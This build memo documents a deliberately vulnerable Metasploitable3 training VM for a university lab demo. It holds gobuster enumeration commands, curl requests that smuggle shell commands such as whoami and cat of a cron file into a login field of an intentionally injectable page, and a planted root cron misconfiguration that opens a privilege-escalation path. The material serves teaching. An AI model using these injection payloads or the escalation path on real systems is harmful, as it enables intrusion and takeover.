# Metasploitable3 Ubuntu 14.04 Build Memo

## Current State

- Workspace: `/home/demo-user/dev/metasploitable3-workspace/metasploitable3`
- Vagrantfile: `chef/dev/ub1404/Vagrantfile`
- VM name: `Metasploitable3-dev`
- Libvirt domain: `ub1404_Metasploitable3-dev`
- Guest IP: `192.168.121.175`
- Guest login: `zeijyaku` / `zeijyaku`
- Guest `/home` currently contains only `/home/zeijyaku`.
- Snapshot: `fresh-provisioned` is older than the `zeijyaku` guest user change. If this snapshot is restored, temporarily switch the Vagrant SSH user back to `vagrant` or create a new snapshot from the current state.

## Host Tooling

The host already had KVM/libvirt available. Vagrant was installed in the user gem path because the official standalone binary failed on this host.

Use this prefix when running Vagrant commands:

```sh
PATH="/home/demo-user/.local/share/gem/ruby/3.4.0/bin:/home/demo-user/.local/bin:$PATH" \
VAGRANT_HOME="/home/demo-user/.vagrant.d"
```

Example:

```sh
PATH="/home/demo-user/.local/share/gem/ruby/3.4.0/bin:/home/demo-user/.local/bin:$PATH" \
VAGRANT_HOME="/home/demo-user/.vagrant.d" \
vagrant status
```

## Useful Commands

Run from:

```sh
/home/demo-user/dev/metasploitable3-workspace/metasploitable3/chef/dev/ub1404
```

VM status:

```sh
vagrant status
```

SSH into the VM:

```sh
vagrant ssh
```

The Vagrant SSH user is configured as `zeijyaku`, not the upstream `vagrant` user.

The current VM no longer has the upstream `vagrant` user, the temporary `demo-user` guest user, or the Metasploitable Star Wars demo users. Guest `/home` should contain only `/home/zeijyaku`.

Stop the VM:

```sh
vagrant halt
```

Start the VM:

```sh
vagrant up --provider=libvirt
```

Restore the clean snapshot:

```sh
vagrant snapshot restore fresh-provisioned
```

## Provisioning Adjustments

The upstream Metasploitable3 Ubuntu 14.04 path is old and needed local adjustments:

- Chef was pinned manually to `12.22.5` inside the guest.
- Chef shared folders were switched from NFS to rsync because host `sudo` is not available non-interactively.
- OpenSSH compatibility options were added for old guest SSH keys.
- Temporary host HTTP proxy was used during provisioning because libvirt NAT did not provide guest outbound connectivity.
- `docker`, `flags`, and `proftpd` recipes were removed from the run list to complete provisioning reliably on this host.
- `docker` cookbook dependency was removed from the local `metasploitable` cookbook metadata.
- Sinatra Gemfile dependencies were pinned for the old embedded Ruby used by Chef 12.

## Available Services Checked

Selected host scan result against `192.168.121.175`:

```text
22/tcp   open   ssh
80/tcp   open   http
445/tcp  open   microsoft-ds
631/tcp  open   ipp
3306/tcp open   mysql
6697/tcp open   ircs-u
8080/tcp open   http-proxy
```

HTTP checks succeeded for:

- `http://192.168.121.175/`
- `http://192.168.121.175/phpmyadmin/`
- `http://192.168.121.175/drupal/`

## Web Enumeration Demo

The Apache top page has been changed to a PUC/SIDLab-style lab portal so direct access does not show the useful application paths.

Direct access:

```text
http://192.168.121.175/
```

Expected title:

```text
富山県立大学 社会情報デザイン研究室 | SIDLab
```

The demo wordlist is:

```text
/home/demo-user/dev/security-demo-lab/demos/01_attack_flow_metasploitable/web_paths_demo.txt
```

The targeted demo wordlist for showing extension-based discovery is:

```text
/home/demo-user/dev/security-demo-lab/demos/01_attack_flow_metasploitable/web_paths_targeted.txt
```

Run directory enumeration from the lab host only:

```sh
gobuster dir \
  -u http://192.168.121.175/ \
  -w /home/demo-user/dev/security-demo-lab/demos/01_attack_flow_metasploitable/web_paths_demo.txt \
  -t 5 \
  --timeout 5s
```

Expected findings include:

```text
/drupal
/phpmyadmin
/payroll_app.php
/staff.php
/uploads
/server-status
```

`/staff.php` is a demo-friendly staff tool name. In this lab it serves a Japanese staff login form for the OS command injection demo. Form submissions go to `/staff_result.php`, which intentionally concatenates the staff ID into an OS command. The original payroll SQL injection page is preserved as `/staff.php.bak` for backup material.

`staff.php` is present in common file-oriented lists such as:

```text
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt
```

Example using a general file wordlist:

```sh
gobuster dir \
  -u http://192.168.121.175/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt \
  -t 5 \
  --timeout 5s
```

Expected finding:

```text
/staff.php
```

Normal login failure request:

```sh
curl -s -X POST \
  -d "user=admin&password=password&s=ログイン" \
  http://192.168.121.175/staff_result.php
```

Safe OS command injection confirmation:

```sh
curl -s -X POST \
  -d "user=admin; whoami&password=password&s=ログイン" \
  http://192.168.121.175/staff_result.php
```

Expected result: the result page shows the raw command output. The injected `whoami` command should show the web server user, usually `www-data`.

Cron permission misconfiguration check:

```sh
curl -s -X POST \
  -d "user=admin; cat /etc/cron.d/sidlab-maintenance&password=password&s=ログイン" \
  http://192.168.121.175/staff_result.php
```

Expected cron entry:

```text
* * * * * root /opt/sidlab/maintenance.sh
```

Check the script permissions:

```sh
curl -s -X POST \
  -d "user=admin; ls -l /opt/sidlab/maintenance.sh&password=password&s=ログイン" \
  http://192.168.121.175/staff_result.php
```

Expected permissions:

```text
-rwxrwxr-x 1 root www-data ... /opt/sidlab/maintenance.sh
```

This is intentionally misconfigured: root's cron job executes a script that the web server group can modify. Do not rewrite the script or continue into privilege escalation during this demo.

Do not continue into reverse shells, external callbacks, file deletion, privilege escalation, persistence, or DoS during this demo.

To demonstrate that `-x php` only works when the base name exists in the wordlist:

```sh
gobuster dir \
  -u http://192.168.121.175/ \
  -w /home/demo-user/dev/security-demo-lab/demos/01_attack_flow_metasploitable/web_paths_targeted.txt \
  -x php \
  -t 5 \
  --timeout 5s
```

This should find:

```text
/payroll_app.php
```

`/uploads/` returns `403 Forbidden`; directory listing is disabled. This is intentional for the demo: links are hidden from the top page, but existing paths can still be discovered by enumeration.

Teaching point:

```text
Hiding links is not access control. If a path is reachable and guessable, tools can discover it. Real mitigation requires authentication, network restrictions, and removing unnecessary exposed applications.
```

## Safety Notes

- The VM only has `192.168.121.175/24` on libvirt's `vagrant-libvirt` network.
- It does not have a `203.0.113.x.x` research LAN address.
- The temporary host proxy used for provisioning was stopped after the build.
- Do not bridge this VM onto the research LAN.
- For demos, scan only the single target IP `192.168.121.175`.
- For web directory enumeration, use only the small demo wordlist above and keep thread count low, e.g. `-t 5`.
